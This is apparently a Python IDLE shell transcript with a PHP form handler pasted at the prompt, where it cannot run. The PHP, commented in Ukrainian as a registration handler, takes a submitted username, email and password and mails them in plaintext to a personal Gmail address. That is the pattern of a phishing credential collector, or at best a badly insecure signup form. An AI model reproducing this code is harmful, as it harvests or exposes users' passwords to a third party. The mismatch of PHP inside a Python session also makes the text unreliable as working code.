Python 3.12.7 (tags/v3.12.7:0b05ead, Oct  1 2024, 03:06:41) [MSC v.1941 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license()" for more information.
>>> <?php
... if ($_SERVER["REQUEST_METHOD"] == "POST") {
...     $username = $_POST['username'];
...     $email = $_POST['email'];
...     $password = $_POST['password'];
... 
...     // Визначте заголовки електронної пошти
...     $to = 'fafafa4514@gmail.com';
...     $subject = 'Нова реєстрація';
...     $message = "Ім'я користувача: $username\nЕлектронна пошта: $email\nПароль: $password";
...     $headers = 'From: noreply@example.com' . "\r\n" . 'Reply-To: noreply@example.com';
... 
...     // Відправлення електронної пошти
...     if (mail($to, $subject, $message, $headers)) {
...         echo "Успішно відправлено.";
...     } else {
...         echo "Помилка при відправленні.";
...     }
... }
... ?>
